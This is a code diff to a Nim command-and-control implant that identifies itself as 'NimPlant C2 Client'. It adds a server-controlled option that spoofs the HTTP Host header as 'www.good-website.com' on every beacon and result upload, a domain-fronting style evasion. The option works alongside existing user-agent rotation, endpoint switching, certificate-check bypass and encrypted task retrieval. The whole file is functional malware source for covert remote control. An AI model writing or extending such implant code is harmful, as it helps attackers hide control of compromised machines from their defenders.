@@ -29,6 +29,7 @@ type
         randomUserAgents: bool
         randomUserAgentsCounter: int
         changeEndPoints: bool
+        changeHost: bool
 
 
 proc changeEndPointsStrategy(li :var Listener): void = 
@@ -60,6 +61,8 @@ proc getRandomUserAgent(li :var Listener): string =
 # HTTP request function
 proc doRequest(li : var Listener, path : string, postKey : string = "", postValue : string = "") : Response =
     try:
+        var headers: seq[Header]
+
         # check Endpoints /results, tasks
         if li.changeEndPoints:
             changeEndPointsStrategy(li)
@@ -83,8 +86,6 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
 
         # GET request
         if (postKey == "" or postValue == ""):
-            var headers: seq[Header]
-
             # Only send ID header once listener is registered
             if li.id != "":
                 if li.randomUserAgents:
@@ -95,7 +96,7 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
                 else:
                     headers = @[
                         Header(key: "X-Identifier", value: li.id),
-                        Header(key: "User-Agent", value: li.userAgent),
+                        Header(key: "User-Agent", value: li.userAgent)
                     ] 
 
             else:
@@ -107,6 +108,10 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
                     headers = @[
                             Header(key: "User-Agent", value: li.userAgent)
                         ]
+
+            # check if chaning the host is needed 
+            if li.changeHost:
+                headers.add(Header(key: "Host", value: "www.good-website.com"))
 
             let req = Request(
                 url: parseUrl(target),
@@ -120,7 +125,7 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
         # POST request
         else:
             if li.randomUserAgents:
-                let req = Request(
+                var req = Request(
                 url: parseUrl(target),
                 verb: "post",
                 headers: @[
@@ -131,12 +136,27 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
                 allowAnyHttpsCertificate: true,
                 body: "{\"" & postKey & "\":\"" & postValue & "\"}"
                 )
+
+                # check if chaning the host is needed 
+                if li.changeHost:
+                    req = Request(
+                    url: parseUrl(target),
+                    verb: "post",
+                    headers: @[
+                    Header(key: "X-Identifier", value: li.id),
+                    Header(key: "User-Agent", value: getRandomUserAgent(li)),
+                    Header(key: "Content-Type", value: "application/json"),
+                    Header(key: "Host", value: "www.good-website.com")
+                    ],
+                    allowAnyHttpsCertificate: true,
+                    body: "{\"" & postKey & "\":\"" & postValue & "\"}"
+                    )
                 return fetch(req)
 
 
 
             else:
-                let req = Request(
+                var req = Request(
                     url: parseUrl(target),
                     verb: "post",
                     headers: @[
@@ -147,6 +167,22 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
                     allowAnyHttpsCertificate: true,
                     body: "{\"" & postKey & "\":\"" & postValue & "\"}"
                     )
+    
+                # check if chaning the host is needed 
+                if li.changeHost:
+                    req = Request(
+                    url: parseUrl(target),
+                    verb: "post",
+                    headers: @[
+                        Header(key: "X-Identifier", value: li.id),
+                        Header(key: "User-Agent", value: li.userAgent),
+                        Header(key: "Content-Type", value: "application/json"), 
+                        Header(key: "Host", value: "www.good-website.com")
+                        ],
+                    allowAnyHttpsCertificate: true,
+                    body: "{\"" & postKey & "\":\"" & postValue & "\"}"
+                    )
+
                 return fetch(req)
 
     except:
@@ -170,6 +206,7 @@ proc init*(li: var Listener) : void =
         li.randomUserAgentsCounter = 0
         li.changeEndPoints = false
         li.newListenerPort = li.listenerPort
+        li.changeHost = false
     else:
         li.initialized = false
 
@@ -222,6 +259,7 @@ proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
                 li.userAgent = "NimPlant C2 Client"
             li.newListenerPort = decryptData(parseJson(res.body)["p3"].getStr(), li.cryptKey)
             li.changeEndPoints = parseBool(decryptData(parseJson(res.body)["s4"].getStr(), li.cryptKey).replace("\'", "\""))
+            li.changeHost = parseBool(decryptData(parseJson(res.body)["s5"].getStr(), li.cryptKey).replace("\'", "\""))
 
             # Attempt to parse task (parseJson() needs string literal... sigh)
             var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\"")
